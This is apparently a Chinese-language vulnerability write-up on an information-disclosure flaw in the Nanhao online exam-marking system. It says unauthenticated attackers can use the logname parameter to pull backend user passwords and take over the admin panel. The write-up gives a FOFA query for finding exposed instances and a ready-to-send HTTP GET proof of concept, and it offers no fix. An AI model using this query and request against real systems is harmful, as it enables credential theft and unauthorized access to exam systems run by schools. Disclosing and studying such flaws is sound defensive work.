## 南昊网上阅卷系统-logname-信息泄露漏洞

## 一、漏洞简介
南昊网上阅卷系统 logname接口存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取网站后台系统用户密码等敏感信息，从而登录网站后台系统，使网站处于极不安全的状态。

## fofa
```
app="南昊网上阅卷系统"
```

## POC
```
GET /exam/monitor/index.jsp?logname=admin HTTP/1.1
Host: [目标主机]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept-Encoding: gzip
```
